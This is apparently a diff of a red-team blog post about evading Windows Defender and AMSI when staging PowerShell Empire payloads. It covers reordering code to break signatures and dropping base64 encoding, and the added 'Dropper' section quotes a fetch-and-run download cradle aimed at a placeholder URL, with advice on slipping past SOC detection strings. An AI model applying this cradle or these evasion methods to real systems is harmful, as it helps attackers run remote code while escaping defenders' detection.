@@ -59,7 +59,6 @@ The stager is coming with SafeChecks enabled by default. Taking a look at what i
 <center><img src="/images/2020-04-16-RedTeam-Exercises-with-OpenSource-Tools-Part-2.md/powershellversion.png">
  </center>
 </div>
-<br/>
 
 <b>2. Rules based on the order of the code's postion:</b><br/>
 BC-Security announced on <a href="https://twitter.com/BCSecurity1/status/1247165928757800965" style="text-decoration: none;">6 April 2020</a> that they updated their HTTP listener to evade Windows Defender again. I was curious and took a look on their <a href="https://github.com/BC-SECURITY/Empire/pull/148/commits/3bc0eb6e435f39981092ed823da623e22146d2bc" style="text-decoration: none;">commit</a> on their Github repo to see what changes they did.
@@ -68,7 +67,6 @@ BC-Security announced on <a href="https://twitter.com/BCSecurity1/status/1247165
 <center><img src="/images/2020-04-16-RedTeam-Exercises-with-OpenSource-Tools-Part-2.md/httpevader.png">
  </center>
 </div>
-<br/>
  
  As I suspected, the order of functions is a really big way that AMSI is fingerprinting now. So to bypass AMSI, we just have to reorder those commands who are idependent.<br/> 
  You can move a number of independent position commands to break the Microsoft's signatures.
@@ -109,6 +107,12 @@ I recommend to turn base64 off. It doesn't add anything to your obfuscation whil
 Most security related solutions created features for detecting base64 encoded strings and analyzing them after the content is decoded. CarbonBlack, FireEye made public their sollutions' capabilities in the past, being clear for us that the above arguments are using as a part of their detection rules: you can read more <a href="https://www.carbonblack.com/2015/08/14/how-to-detect-powershell-empire-with-carbon-black/" style="text-decoration: none;">here</a> and <a href="https://www.fireeye.com/blog/threat-research/2018/07/malicious-powershell-detection-via-machine-learning.html" style="text-decoration: none;">here</a>.  
 
 <br/>Now that I identified almost all the patterns that are triggering the Microsoft's signatures, let's speak about the dropper before starting with the demo.
+
+<b> Dropper </b><br/>
+Maybe many of you are just using the powershell command "IEX((New-Object System.Net.WebClient).downloadstring('http://something'));" for downloading in memory your payload. I worked in a SOC and I know the strings "new-object","Webclient","downloadstring" are used by many for detecting malicious events so I do not want be catched by any blue team. This being said, I do not want to be catched by some basic rules for detecting suspicious powershell so I will make use of a open source tool made special for this kind of tasks.<br/>
+Like as Invoke-Obfuscation, Daniel Bohannon created a <a href="https://github.com/danielbohannon/Invoke-CradleCrafter" style="text-decoration: none;">tool</a> like as Invoke-Obfuscation, for obfuscated in memory or on disk downloader. 
+
+I invite you to take a look on it in case you are interested in using the downloader on disk. I am using the only in memory downloader.
 
 <b> Demo </b><br/>
 
